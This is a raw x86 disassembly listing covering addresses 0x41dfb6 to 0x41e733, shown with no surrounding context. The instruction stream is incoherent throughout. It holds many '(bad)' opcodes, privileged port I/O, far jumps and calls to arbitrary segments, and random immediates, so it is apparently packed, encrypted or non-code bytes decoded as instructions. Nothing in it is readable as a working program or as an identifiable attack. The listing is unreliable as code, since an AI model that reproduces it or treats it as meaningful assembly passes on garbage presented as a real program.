  41dfb6:	in     eax,0x94
  41dfb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfb9:	mov    al,0xef
  41dfbb:	clc    
  41dfbc:	cld    
  41dfbd:	loop   0x41df7c
  41dfbf:	lods   eax,DWORD PTR ds:[esi]
  41dfc0:	lds    esi,FWORD PTR [ebp-0x634e2eab]
  41dfc6:	xor    BYTE PTR [edi+0x3373d17b],ch
  41dfcc:	stos   BYTE PTR es:[edi],al
  41dfcd:	scas   eax,DWORD PTR es:[edi]
  41dfce:	mov    edi,0xa28e55d5
  41dfd3:	inc    esp
  41dfd4:	xchg   ecx,eax
  41dfd5:	sub    BYTE PTR [ecx],al
  41dfd7:	mov    cl,0xd8
  41dfd9:	cli    
  41dfda:	jmp    0x41df96
  41dfdc:	(bad)  
  41dfdd:	das    
  41dfde:	nop
  41dfdf:	mov    bl,0xd4
  41dfe1:	cmp    edx,DWORD PTR [edi-0x2e884ab7]
  41dfe7:	mov    BYTE PTR [ebx],ch
  41dfe9:	test   DWORD PTR [esi+eiz*1],ecx
  41dfec:	push   ds
  41dfed:	xlat   BYTE PTR ds:[ebx]
  41dfee:	mov    cl,0xc6
  41dff0:	mov    esi,0x3ce5e6a4
  41dff5:	xchg   edi,eax
  41dff6:	stos   BYTE PTR es:[edi],al
  41dff7:	push   edi
  41dff8:	cmp    BYTE PTR [edi+0x1b],dh
  41dffb:	cmp    cl,BYTE PTR [esp+eax*4]
  41dffe:	(bad)  
  41dfff:	test   al,0xe8
  41e001:	test   BYTE PTR [ebp+0x34],ch
  41e004:	push   es
  41e005:	xlat   BYTE PTR ds:[ebx]
  41e006:	loop   0x41e083
  41e008:	js     0x41dfff
  41e00a:	test   BYTE PTR [esi],cl
  41e00c:	jmp    0xf0125cd8
  41e011:	and    DWORD PTR [edi-0xf],edx
  41e014:	dec    esi
  41e015:	push   ebx
  41e016:	mov    al,ds:0x6c4e0bc8
  41e01b:	dec    ecx
  41e01c:	ret    
  41e01d:	push   0x23
  41e01f:	adc    BYTE PTR [eax],dh
  41e021:	popf   
  41e022:	leave  
  41e023:	clc    
  41e024:	xchg   esp,esi
  41e026:	data16 mov cl,0xc0
  41e029:	mov    dh,0x8b
  41e02b:	outs   dx,DWORD PTR ds:[esi]
  41e02c:	jge    0x41e07e
  41e02e:	push   esp
  41e02f:	adc    dl,BYTE PTR [ebx-0x71c1adc9]
  41e035:	cli    
  41e036:	int3   
  41e037:	(bad)  
  41e038:	ds inc eax
  41e03a:	add    DWORD PTR [ebx-0x690df1ee],ebx
  41e040:	daa    
  41e041:	push   eax
  41e042:	push   cs
  41e043:	out    dx,eax
  41e044:	int3   
  41e045:	jmp    FWORD PTR [ebx]
  41e047:	aad    0x13
  41e049:	mov    al,ds:0xa56e330
  41e04e:	xchg   ecx,eax
  41e04f:	cmp    al,0xfc
  41e051:	mov    BYTE PTR [edi],ch
  41e053:	out    0x43,eax
  41e055:	jmp    0x41dfd8
  41e057:	mov    al,ds:0x949296dc
  41e05c:	or     eax,0xfb9e733e
  41e061:	push   es
  41e062:	xchg   DWORD PTR [ecx+edx*8+0x57226b9a],edi
  41e069:	in     al,0xd
  41e06b:	fcom   QWORD PTR [ecx+0x26e8db60]
  41e071:	iret   
  41e072:	push   0x7fd9b854
  41e077:	sub    al,0x72
  41e079:	rol    BYTE PTR ds:0x1bed9828,0x3e
  41e080:	adc    eax,0x773f4058
  41e085:	mov    al,0xe4
  41e087:	test   al,0xb8
  41e089:	cmp    eax,0x342ba7e3
  41e08e:	jmp    0x7f57:0x64d7ec83
  41e095:	xor    bh,BYTE PTR [edi-0x668297a]
  41e09b:	mov    DWORD PTR [ebp-0x38],edx
  41e09e:	(bad)  
  41e09f:	icebp  
  41e0a0:	push   edx
  41e0a1:	sbb    edi,eax
  41e0a3:	enter  0x781b,0x63
  41e0a7:	sbb    ah,dh
  41e0a9:	pop    edi
  41e0aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0ab:	add    al,0x1b
  41e0ad:	xor    eax,0xf3edddd5
  41e0b2:	in     al,0xeb
  41e0b4:	or     DWORD PTR [ecx],eax
  41e0b6:	popf   
  41e0b7:	cmp    esp,DWORD PTR [ebp-0x24]
  41e0ba:	loope  0x41e06f
  41e0bc:	lahf   
  41e0bd:	dec    ecx
  41e0be:	loop   0x41e09c
  41e0c0:	aam    0x2c
  41e0c2:	cmp    bl,BYTE PTR [edi]
  41e0c4:	xchg   edi,eax
  41e0c5:	and    eax,0xaf043f0e
  41e0ca:	xor    DWORD PTR [eax],esp
  41e0cc:	mov    ch,0x51
  41e0ce:	sbb    ah,BYTE PTR [eax-0x6f]
  41e0d1:	jno    0x41e096
  41e0d3:	(bad)  
  41e0d4:	and    al,0xc6
  41e0d6:	mov    cl,0xb
  41e0d8:	mov    edi,0xe9819d27
  41e0dd:	(bad)  
  41e0de:	aaa    
  41e0df:	xchg   ebp,eax
  41e0e0:	jb     0x41e111
  41e0e2:	mov    ch,0x96
  41e0e4:	cld    
  41e0e5:	push   esi
  41e0e6:	add    BYTE PTR [ebx-0x6c9a94a6],ah
  41e0ec:	pusha  
  41e0ed:	xchg   ebp,eax
  41e0ee:	cwde   
  41e0ef:	mov    dl,ch
  41e0f1:	xchg   ebx,eax
  41e0f2:	push   ecx
  41e0f3:	mov    edi,0x1173d079
  41e0f8:	jo     0x41e108
  41e0fa:	add    al,0x2c
  41e0fc:	pop    es
  41e0fd:	ss imul ebp,eax,0xaa4a386a
  41e104:	mov    ch,0xc5
  41e106:	and    eax,0x7314a72a
  41e10b:	mov    dh,0x2a
  41e10d:	es ja  0x41e0a3
  41e110:	popa   
  41e111:	xchg   ecx,eax
  41e112:	not    BYTE PTR [ebx+0x26649a5a]
  41e118:	jmp    0x4cb0:0x66fcb7ac
  41e11f:	(bad)  
  41e120:	retf   
  41e121:	call   0x9c994076
  41e126:	mov    dl,0x57
  41e128:	fcmovnbe st,st(0)
  41e12a:	and    eax,0xf093177d
  41e12f:	into   
  41e130:	mov    ds:0xda21141,eax
  41e135:	pusha  
  41e136:	and    eax,0x64c6e0e0
  41e13b:	mov    esp,DWORD PTR [eax-0x3f5cf9f8]
  41e141:	jl     0x41e158
  41e143:	jb     0x41e181
  41e145:	cmp    BYTE PTR [edi],0xcf
  41e148:	inc    edx
  41e149:	and    cl,dl
  41e14b:	(bad)  
  41e14c:	mov    eax,0x3ceac37d
  41e151:	inc    edx
  41e152:	inc    ebp
  41e153:	imul   edi,DWORD PTR ds:0xf4285685,0xd549fe35
  41e15d:	stos   BYTE PTR es:[edi],al
  41e15e:	(bad)  
  41e15f:	shr    edi,0x83
  41e162:	push   ss
  41e163:	add    al,0xb8
  41e165:	in     al,0xc4
  41e167:	gs sbb esp,ebp
  41e16a:	push   ecx
  41e16b:	aad    0xfa
  41e16d:	sbb    bl,BYTE PTR [esi+0x3a8cb1d7]
  41e173:	(bad)  [eax]
  41e175:	mov    ch,BYTE PTR [ebx-0x623dabb3]
  41e17b:	add    ch,ch
  41e17d:	lea    esp,[ebx+edi*8+0x2b0b41b3]
  41e184:	dec    ecx
  41e185:	pop    edi
  41e186:	into   
  41e187:	xchg   edx,eax
  41e188:	pop    ecx
  41e189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e18a:	xor    al,0x0
  41e18c:	cli    
  41e18d:	pop    esi
  41e18e:	xchg   edx,eax
  41e18f:	neg    DWORD PTR [edx-0x5e]
  41e192:	gs das 
  41e194:	inc    eax
  41e195:	mov    esi,0x967e6b37
  41e19a:	mov    esi,0x5aed5e7b
  41e19f:	out    dx,eax
  41e1a0:	fsubr  DWORD PTR [edx-0x5e53ad4b]
  41e1a6:	rcl    dl,0xad
  41e1a9:	cmp    ah,bh
  41e1ab:	popf   
  41e1ac:	push   edi
  41e1ad:	or     DWORD PTR [edx+edx*8],ecx
  41e1b0:	vandps ymm7,ymm1,YMMWORD PTR [edx]
  41e1b4:	adc    BYTE PTR [ecx+0x61],ah
  41e1b7:	add    dh,BYTE PTR [esi]
  41e1b9:	std    
  41e1ba:	or     BYTE PTR [ebx],dl
  41e1bc:	out    dx,al
  41e1bd:	jecxz  0x41e171
  41e1bf:	mov    bl,bl
  41e1c1:	dec    ebx
  41e1c2:	nop
  41e1c3:	xchg   esp,eax
  41e1c4:	xor    al,0xfd
  41e1c6:	imul   DWORD PTR [esi]
  41e1c8:	xor    ebp,esi
  41e1ca:	stc    
  41e1cb:	dec    edi
  41e1cc:	(bad)  
  41e1cd:	stc    
  41e1ce:	(bad)  
  41e1cf:	loopne 0x41e20f
  41e1d1:	leave  
  41e1d2:	and    esi,DWORD PTR [ebx+0x35]
  41e1d5:	jns    0x41e189
  41e1d7:	jno    0x41e1a3
  41e1d9:	and    eax,0x1a6ecd8
  41e1de:	enter  0xebe0,0x25
  41e1e2:	or     esi,DWORD PTR [ecx-0xe]
  41e1e5:	jbe    0x41e260
  41e1e7:	fidiv  WORD PTR [edx+0x72]
  41e1ea:	lahf   
  41e1eb:	(bad)  
  41e1ec:	adc    BYTE PTR [eax+0x30],ch
  41e1ef:	mov    eax,0x6504f656
  41e1f4:	scas   al,BYTE PTR es:[edi]
  41e1f5:	and    eax,0x10b314d5
  41e1fa:	out    dx,eax
  41e1fb:	add    ebp,ebp
  41e1fd:	mov    ah,0x1
  41e1ff:	jns    0x41e19d
  41e201:	sbb    si,WORD PTR [ecx-0x35760052]
  41e208:	or     eax,0xd60fc155
  41e20d:	shl    eax,1
  41e20f:	ins    BYTE PTR es:[edi],dx
  41e210:	pop    edx
  41e211:	or     eax,0x6f01e4f8
  41e216:	jae    0x41e28a
  41e218:	sbb    BYTE PTR [edi-0x5eba2e7e],bh
  41e21e:	(bad)  
  41e21f:	pop    esp
  41e220:	add    ah,BYTE PTR [edi]
  41e222:	icebp  
  41e223:	xchg   edi,eax
  41e224:	rcl    DWORD PTR [ecx+0x109af364],1
  41e22a:	je     0x41e272
  41e22c:	imul   edi,DWORD PTR [eax+0x63f4b3d1],0x595e7b6f
  41e236:	mov    al,0xf
  41e238:	cli    
  41e239:	xchg   esp,eax
  41e23a:	push   esi
  41e23b:	repnz fisub DWORD PTR [esi]
  41e23e:	in     eax,0x54
  41e240:	sti    
  41e241:	push   cs
  41e242:	hlt    
  41e243:	xor    cl,BYTE PTR [ebp+0x34164a63]
  41e249:	jb     0x41e1eb
  41e24b:	imul   ecx,DWORD PTR [edx-0x165399fa],0xe00d3783
  41e255:	xor    DWORD PTR [esi-0x3c],eax
  41e258:	test   BYTE PTR [eax-0x5428a364],bh
  41e25e:	add    al,bl
  41e260:	mov    eax,ds:0x5efedbd4
  41e265:	mov    bl,0xbe
  41e267:	or     eax,0x524b559b
  41e26c:	mul    ebp
  41e26e:	dec    esp
  41e26f:	div    BYTE PTR [edi-0x6a1e87b8]
  41e275:	pusha  
  41e276:	add    al,0x37
  41e278:	push   esp
  41e279:	dec    ebp
  41e27a:	mov    edx,0xf863058b
  41e27f:	and    esp,DWORD PTR [esi+eax*8-0x564e516a]
  41e286:	ret    
  41e287:	loopne 0x41e21e
  41e289:	jne    0x41e265
  41e28b:	push   ebp
  41e28c:	mov    ebx,0xc45263bf
  41e291:	mov    dl,0xc2
  41e293:	pop    esp
  41e294:	sbb    ecx,0xe3dc7e92
  41e29a:	or     al,0x18
  41e29c:	imul   esi,DWORD PTR [ebx+0x7c67e275],0x63
  41e2a3:	int3   
  41e2a4:	fbld   TBYTE PTR [edi-0x4cd19926]
  41e2aa:	xor    BYTE PTR [ecx],bh
  41e2ac:	dec    ebx
  41e2ad:	outs   dx,DWORD PTR ds:[esi]
  41e2ae:	dec    ebx
  41e2af:	ss adc eax,0xdb6b4bc2
  41e2b5:	std    
  41e2b6:	test   DWORD PTR ds:0x253cc790,0x64e6b23
  41e2c0:	sahf   
  41e2c1:	xor    BYTE PTR [ecx-0x32504f96],0xbc
  41e2c8:	mov    ebx,0x9190c59f
  41e2cd:	loopne 0x41e30c
  41e2cf:	push   edi
  41e2d0:	pop    ecx
  41e2d1:	mov    esp,0xff71c153
  41e2d6:	shl    BYTE PTR gs:[edx-0x1a],1
  41e2da:	mov    ebp,ebx
  41e2dc:	push   edi
  41e2dd:	scas   eax,DWORD PTR es:[edi]
  41e2de:	stos   DWORD PTR es:[edi],eax
  41e2df:	push   edi
  41e2e0:	rcr    esp,0x75
  41e2e3:	pop    ecx
  41e2e4:	lahf   
  41e2e5:	pop    edi
  41e2e6:	cmp    eax,0x5ad1d034
  41e2eb:	push   edi
  41e2ec:	cs lahf 
  41e2ee:	mov    bh,0x97
  41e2f0:	jmp    0xc69cdc48
  41e2f5:	rcl    BYTE PTR [eax+edx*1+0x6b8af9ef],0xf5
  41e2fd:	push   DWORD PTR [ebp+edi*1+0x7f]
  41e301:	inc    eax
  41e302:	mov    ecx,0x554f105
  41e307:	inc    esp
  41e308:	dec    ebp
  41e309:	mov    dh,0x96
  41e30b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e30c:	jb     0x41e38a
  41e30e:	mov    ebx,0xf62fcb2f
  41e313:	xchg   BYTE PTR ds:0x276c3ff6,dh
  41e319:	xlat   BYTE PTR ss:[ebx]
  41e31b:	add    BYTE PTR [esi],cl
  41e31d:	loope  0x41e2dc
  41e31f:	add    ah,al
  41e321:	aad    0xe9
  41e323:	cmp    edx,esp
  41e325:	fcomp  DWORD PTR [esi-0x2854699e]
  41e32b:	retf   
  41e32c:	sbb    esi,edx
  41e32e:	ins    BYTE PTR es:[edi],dx
  41e32f:	push   ds
  41e330:	mov    ah,0x66
  41e332:	xchg   dh,ah
  41e334:	jae    0x41e2e2
  41e336:	inc    esp
  41e337:	cdq    
  41e338:	in     al,dx
  41e339:	cmp    bh,BYTE PTR [ecx+0x72]
  41e33c:	fs inc ebx
  41e33e:	test   BYTE PTR [edi-0x47],ch
  41e341:	dec    ecx
  41e342:	test   eax,0xeb43627a
  41e347:	mov    ebp,0x54def1bf
  41e34c:	mov    ah,0x32
  41e34e:	in     eax,0x8f
  41e350:	sbb    eax,0x3ea447e0
  41e355:	pop    ss
  41e356:	std    
  41e357:	clc    
  41e358:	push   ebp
  41e359:	rcr    BYTE PTR [eax+0x58],1
  41e35c:	cdq    
  41e35d:	sub    edi,DWORD PTR [ebp+edi*4-0x2cb6170]
  41e364:	adc    DWORD PTR [edx+0x55],esi
  41e367:	cld    
  41e368:	hlt    
  41e369:	(bad)  
  41e36a:	inc    ebp
  41e36b:	pop    esp
  41e36c:	int    0x9b
  41e36e:	iret   
  41e36f:	cmc    
  41e370:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e371:	mov    esi,DWORD PTR [edi]
  41e373:	das    
  41e374:	adc    BYTE PTR [edx],ch
  41e376:	jbe    0x41e30e
  41e378:	push   edx
  41e379:	das    
  41e37a:	pop    esi
  41e37b:	xor    bh,BYTE PTR [esi]
  41e37d:	repnz imul esp,DWORD PTR [ecx+0x51854760],0x7795e09d
  41e388:	mov    DWORD PTR [eax+0x73],esi
  41e38b:	fidiv  DWORD PTR [esi+0xe393431]
  41e391:	lods   al,BYTE PTR ds:[esi]
  41e392:	push   edi
  41e393:	(bad)  
  41e394:	in     al,0x9c
  41e396:	mov    al,0x77
  41e398:	pushf  
  41e399:	and    BYTE PTR [edx+0x3d],cl
  41e39c:	ret    0x475
  41e39f:	jp     0x41e33d
  41e3a1:	imul   ebp,ebx,0xffffffac
  41e3a4:	xchg   edi,eax
  41e3a5:	imul   BYTE PTR [edi-0x24e088ae]
  41e3ab:	xchg   esi,eax
  41e3ac:	(bad)  
  41e3ad:	fidiv  DWORD PTR [edi+edi*1]
  41e3b0:	mov    eax,ds:0x7c8442f6
  41e3b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3b6:	fdiv   st(4),st
  41e3b8:	cld    
  41e3b9:	or     BYTE PTR [ecx+0x56],dl
  41e3bc:	add    edi,ebx
  41e3be:	xlat   BYTE PTR ds:[ebx]
  41e3bf:	ficomp DWORD PTR [ecx]
  41e3c1:	sub    al,0x46
  41e3c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3c4:	adc    BYTE PTR [eax-0x4b],bh
  41e3c7:	or     eax,0xeec849
  41e3cc:	jo     0x41e387
  41e3ce:	push   eax
  41e3cf:	mov    eax,ds:0xf6d62bb9
  41e3d4:	imul   esi,DWORD PTR [edi+0x13561f6d],0x3b
  41e3db:	retf   0xfb9e
  41e3de:	or     ebp,esp
  41e3e0:	fmulp  st(0),st
  41e3e2:	inc    edx
  41e3e3:	mov    WORD PTR ds:0x4f60fcbe,cs
  41e3e9:	push   esp
  41e3ea:	cmp    al,0x32
  41e3ec:	cmp    eax,0xa1574d
  41e3f1:	mov    eax,ds:0xf8f7fd36
  41e3f6:	jg     0x41e3e3
  41e3f8:	cmp    ecx,ecx
  41e3fa:	adc    al,0x50
  41e3fc:	out    0xa8,al
  41e3fe:	lock arpl WORD PTR [eax],bx
  41e401:	sub    DWORD PTR [ebp-0x78],ebx
  41e404:	(bad)  
  41e405:	mov    ebx,0x22f96240
  41e40a:	jnp    0x41e3ee
  41e40c:	xchg   edx,eax
  41e40d:	adc    eax,0x99704f74
  41e412:	and    DWORD PTR ds:[eax+0x6f8b52b4],esp
  41e419:	sahf   
  41e41a:	lock cld 
  41e41c:	and    BYTE PTR [eax+0x51bd7aeb],0xdb
  41e423:	sbb    ch,BYTE PTR [ebx+0x4c]
  41e426:	cdq    
  41e427:	sub    bl,BYTE PTR [edx]
  41e429:	xchg   esi,eax
  41e42a:	mov    esi,0x10f99818
  41e42f:	(bad)  
  41e431:	add    DWORD PTR [edi+0x6f67ff47],ecx
  41e437:	xor    DWORD PTR [eax-0x75],edi
  41e43a:	inc    eax
  41e43b:	mov    ah,BYTE PTR [ebp+0x1e]
  41e43e:	mov    dh,dl
  41e440:	popa   
  41e441:	and    DWORD PTR [esi+ebx*4],ecx
  41e444:	jmp    0xb52:0x98b56d1
  41e44b:	mov    eax,ds:0x466773ae
  41e450:	call   0x2d9e:0x951a49b1
  41e457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e458:	fs mov cl,0xbf
  41e45b:	mov    BYTE PTR [edx-0xc],ch
  41e45e:	imul   esi,DWORD PTR [esi+0x60efd092],0x61
  41e465:	dec    ecx
  41e466:	sub    al,0x18
  41e468:	mov    ebx,0x28f27608
  41e46d:	(bad)  
  41e46e:	rcl    BYTE PTR ds:0x4076d6fe,1
  41e474:	sub    esi,DWORD PTR [ebp+0x44]
  41e477:	das    
  41e478:	dec    edx
  41e479:	mov    ds:0x23f44395,al
  41e47e:	dec    edi
  41e47f:	das    
  41e480:	cli    
  41e481:	nop
  41e482:	dec    edx
  41e483:	fiadd  DWORD PTR [esi-0x30]
  41e486:	int    0x5d
  41e488:	pop    DWORD PTR [esi]
  41e48a:	cld    
  41e48b:	and    BYTE PTR [esi],ch
  41e48d:	into   
  41e48e:	mov    dh,0xf5
  41e490:	mov    WORD PTR [ecx+0x2222c66f],ss
  41e496:	sbb    eax,0x5028166b
  41e49b:	test   DWORD PTR [eax-0x1e],esp
  41e49e:	mov    ch,0x7d
  41e4a0:	popa   
  41e4a1:	ins    DWORD PTR es:[edi],dx
  41e4a2:	ja     0x41e452
  41e4a4:	or     ebp,0x3a
  41e4a7:	cdq    
  41e4a8:	sub    DWORD PTR [edx-0x56],edx
  41e4ab:	repz gs cmp eax,edx
  41e4af:	mov    esi,0x76434f00
  41e4b4:	jmp    0xb4d8:0x2d5df2cf
  41e4bb:	jle    0x41e457
  41e4bd:	mov    esi,0x1f4fa8d
  41e4c2:	sbb    BYTE PTR [edx],cl
  41e4c4:	or     DWORD PTR [esi+0x71],eax
  41e4c7:	gs jbe 0x41e4e5
  41e4ca:	xlat   BYTE PTR ds:[ebx]
  41e4cb:	jb     0x41e509
  41e4cd:	in     eax,dx
  41e4ce:	icebp  
  41e4cf:	loop   0x41e466
  41e4d1:	push   es
  41e4d2:	xlat   BYTE PTR ds:[ebx]
  41e4d3:	loopne 0x41e4d3
  41e4d5:	rcr    BYTE PTR [edi+0x39b20089],cl
  41e4db:	dec    eax
  41e4dc:	jmp    0xafa79968
  41e4e1:	outs   dx,BYTE PTR ds:[esi]
  41e4e2:	pop    esi
  41e4e3:	pop    eax
  41e4e4:	loopne 0x41e525
  41e4e6:	popf   
  41e4e7:	fdiv   DWORD PTR [ebx-0x6c645dd0]
  41e4ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4ee:	mov    esp,0x938ddf7e
  41e4f3:	enter  0x1b8f,0x5e
  41e4f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4f8:	(bad)  
  41e4f9:	pop    esp
  41e4fa:	enter  0x7ed3,0x3f
  41e4fe:	mov    esi,0x1ca68233
  41e503:	test   DWORD PTR [ebp+edx*2-0x73],ebx
  41e507:	dec    edx
  41e508:	js     0x41e48e
  41e50a:	dec    esp
  41e50b:	rcr    DWORD PTR [edx+0x3e146c1f],0x33
  41e512:	inc    edi
  41e513:	jbe    0x41e509
  41e515:	or     esi,esp
  41e517:	fadd   DWORD PTR [ebp+0x2e]
  41e51a:	xor    bl,BYTE PTR ds:0xed3f7d12
  41e520:	cli    
  41e521:	call   0xc5fd:0x298e7f93
  41e528:	mov    ss,WORD PTR [eax-0x6ea35f29]
  41e52e:	sub    ecx,DWORD PTR [ebx+0x3e]
  41e531:	mov    ds,WORD PTR [ebx-0x696179ca]
  41e537:	jb     0x41e527
  41e539:	adc    al,0xbe
  41e53b:	repz cli 
  41e53d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e53e:	sub    DWORD PTR [edi+edi*8-0x9e60882],ebx
  41e545:	mov    ebp,0x284111de
  41e54a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e54b:	push   0x26fec079
  41e550:	inc    ecx
  41e551:	in     al,dx
  41e552:	mov    dh,0xbf
  41e554:	xchg   ecx,eax
  41e555:	or     BYTE PTR [edx-0x22ac3780],al
  41e55b:	sub    al,0xbc
  41e55d:	pop    eax
  41e55e:	and    al,dh
  41e560:	fwait
  41e561:	rcr    DWORD PTR [ebp-0x21],cl
  41e564:	hlt    
  41e565:	mov    ch,0x24
  41e567:	outs   dx,BYTE PTR ds:[esi]
  41e568:	fimul  DWORD PTR ds:0x7262d718
  41e56e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e56f:	gs cmp dl,ah
  41e572:	pop    es
  41e573:	adc    BYTE PTR [ebx-0x5a],cl
  41e576:	xchg   ebx,eax
  41e577:	test   DWORD PTR [ebx-0x2d],edx
  41e57a:	sbb    eax,DWORD PTR [ecx]
  41e57c:	sbb    eax,0xf9cd6580
  41e581:	(bad)  
  41e582:	cli    
  41e583:	mov    DWORD PTR [eax+edi*4-0x1642418c],edi
  41e58a:	pop    ds
  41e58b:	or     esp,DWORD PTR [esp+ebp*1]
  41e58e:	inc    esp
  41e58f:	pop    ebx
  41e590:	inc    esp
  41e591:	lods   al,BYTE PTR ds:[esi]
  41e592:	imul   ecx,edx,0x53b3e900
  41e598:	adc    ebx,DWORD PTR [edx-0x578931a]
  41e59e:	cmc    
  41e59f:	and    BYTE PTR [edi-0x4c],0xab
  41e5a3:	sahf   
  41e5a4:	mov    WORD PTR [eax],cs
  41e5a6:	add    DWORD PTR [edx+0x3],eax
  41e5a9:	or     edx,eax
  41e5ab:	add    bl,al
  41e5ad:	sbb    eax,0x85fc33ee
  41e5b2:	ret    0xea14
  41e5b5:	inc    ebx
  41e5b6:	mov    di,0xe319
  41e5ba:	mov    dh,BYTE PTR [ebp-0x11b0d5cb]
  41e5c0:	xchg   edi,eax
  41e5c1:	push   ds
  41e5c2:	xchg   edx,eax
  41e5c3:	and    ebp,DWORD PTR [esi+0x4764cf16]
  41e5c9:	xchg   ebx,eax
  41e5ca:	int3   
  41e5cb:	sbb    edi,DWORD PTR [esi+0xed66c73]
  41e5d1:	mov    ds,WORD PTR [esi-0x1c57b7e8]
  41e5d7:	push   esp
  41e5d8:	call   0x3907:0xe43b7108
  41e5df:	mov    esi,ecx
  41e5e1:	push   eax
  41e5e2:	rol    cl,cl
  41e5e4:	dec    ecx
  41e5e5:	jns    0x41e5cf
  41e5e7:	out    0x3b,al
  41e5e9:	mov    al,0xc0
  41e5eb:	mov    esi,0x76ec66a0
  41e5f0:	jmp    0x29b400f4
  41e5f5:	movhlps xmm4,xmm4
  41e5f8:	xchg   ebx,eax
  41e5f9:	shl    BYTE PTR [ebp+0x7acda167],0x46
  41e600:	and    BYTE PTR [esi+0x7e],ch
  41e603:	out    dx,eax
  41e604:	fsub   QWORD PTR [esi]
  41e606:	shl    al,0x0
  41e609:	scas   eax,DWORD PTR es:[edi]
  41e60a:	jecxz  0x41e621
  41e60c:	cmp    BYTE PTR [esi],bl
  41e60e:	movhps QWORD PTR [edx],xmm2
  41e611:	test   ch,0xb9
  41e614:	sub    ebx,DWORD PTR [ecx+ebp*2+0x7b74569a]
  41e61b:	mov    dl,0xbd
  41e61d:	jge    0x41e5d8
  41e61f:	mov    ds:0x13339592,al
  41e624:	ja     0x41e691
  41e626:	adc    eax,0x55d467fd
  41e62b:	fs xchg ebx,eax
  41e62d:	add    dh,BYTE PTR [ecx+0x53c6996f]
  41e633:	inc    ebx
  41e634:	out    dx,eax
  41e635:	test   esi,0x4247fa98
  41e63b:	aas    
  41e63c:	cdq    
  41e63d:	sbb    eax,ecx
  41e63f:	sub    dh,BYTE PTR [ebx-0x1dc3ac36]
  41e645:	xchg   esp,eax
  41e646:	mov    ds:0x3d269b07,al
  41e64b:	and    eax,0x170450a8
  41e650:	cld    
  41e651:	ins    BYTE PTR es:[edi],dx
  41e652:	add    DWORD PTR [edi],0x35
  41e655:	push   ebp
  41e656:	jne    0x41e6d7
  41e658:	mov    WORD PTR [ebp-0x43],?
  41e65b:	xor    eax,0xcd16cf19
  41e660:	mov    BYTE PTR [esi-0x2063b987],ch
  41e666:	sti    
  41e667:	push   es
  41e668:	mov    ds:0x2f60f68d,al
  41e66d:	ret    0xbdc8
  41e670:	cld    
  41e671:	cld    
  41e672:	mov    ah,0x2
  41e674:	add    ebp,DWORD PTR [edi-0x659a9d07]
  41e67a:	push   ebp
  41e67b:	xchg   BYTE PTR [edi+0x7a978afd],ch
  41e681:	pop    ecx
  41e682:	or     DWORD PTR [ebx],ecx
  41e684:	ret    
  41e685:	outs   dx,DWORD PTR ds:[esi]
  41e686:	pushf  
  41e687:	pop    ebp
  41e688:	(bad)  
  41e689:	push   eax
  41e68a:	inc    ebx
  41e68b:	jle    0x41e6a2
  41e68d:	call   0xd46c:0x744b6a10
  41e694:	add    ecx,esp
  41e696:	fdivr  st,st(0)
  41e698:	mul    BYTE PTR [ecx+0x61]
  41e69b:	and    al,0xb6
  41e69d:	cmp    esp,DWORD PTR [esi+0x5c]
  41e6a0:	scas   al,BYTE PTR es:[edi]
  41e6a1:	sti    
  41e6a2:	xlat   BYTE PTR ds:[ebx]
  41e6a3:	and    BYTE PTR [edi],dh
  41e6a5:	ret    
  41e6a6:	mov    eax,ds:0x853e473b
  41e6ab:	xlat   BYTE PTR ds:[ebx]
  41e6ac:	jge    0x41e69b
  41e6ae:	inc    edx
  41e6af:	fdivr  QWORD PTR [ecx+0x53a5de]
  41e6b5:	sar    BYTE PTR [ebx],1
  41e6b7:	pop    ds
  41e6b8:	jae    0x41e6a2
  41e6ba:	jbe    0x41e67c
  41e6bc:	mov    cl,0xd2
  41e6be:	addr16 popf 
  41e6c0:	loopne 0x41e67b
  41e6c2:	sbb    ch,BYTE PTR [eax-0x5a03f2aa]
  41e6c8:	xchg   ebx,eax
  41e6c9:	pop    ecx
  41e6ca:	popa   
  41e6cb:	rcr    DWORD PTR [edi+0x7f],cl
  41e6ce:	arpl   WORD PTR [edx+0x7],bx
  41e6d1:	xlat   BYTE PTR ds:[ebx]
  41e6d2:	or     eax,0xa349ab7d
  41e6d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6d8:	mov    DWORD PTR [ebx-0x42],edx
  41e6db:	sahf   
  41e6dc:	or     eax,0xb81cf7ad
  41e6e1:	jecxz  0x41e6eb
  41e6e3:	ins    BYTE PTR es:[edi],dx
  41e6e4:	rcl    BYTE PTR [edx],1
  41e6e6:	mov    edi,0x7109b95c
  41e6eb:	fbld   TBYTE PTR [ecx+0x54]
  41e6ee:	xor    ebp,DWORD PTR [eax+0x43]
  41e6f1:	add    DWORD PTR [edi+eax*4],ecx
  41e6f4:	ror    DWORD PTR [edi-0x20dc1cf9],0x73
  41e6fb:	iret   
  41e6fc:	mov    es,WORD PTR [ebx+0x260aa2f8]
  41e702:	xchg   BYTE PTR [ecx],al
  41e704:	sbb    al,0x28
  41e706:	arpl   bp,di
  41e708:	and    al,BYTE PTR [ebx]
  41e70a:	(bad)  
  41e70b:	or     DWORD PTR [ebx+0x4f],ebp
  41e70e:	sub    eax,0xef4d1d93
  41e714:	(bad)  
  41e715:	and    DWORD PTR [edx+edi*2],ecx
  41e718:	jns    0x41e708
  41e71a:	loopne 0x41e6f5
  41e71c:	push   ds
  41e71d:	dec    ebp
  41e71e:	push   ebx
  41e71f:	push   cs
  41e720:	gs sbb al,0x66
  41e723:	add    al,0x7d
  41e725:	daa    
  41e726:	or     dh,BYTE PTR [ecx-0x14]
  41e729:	(bad)  
  41e72a:	ror    esp,1
  41e72c:	xchg   ecx,eax
  41e72d:	jle    0x41e752
  41e72f:	or     esi,DWORD PTR [edi]
  41e731:	jle    0x41e7a7
  41e733:	fbstp  TBYTE PTR [ecx-0xeadf0a8]
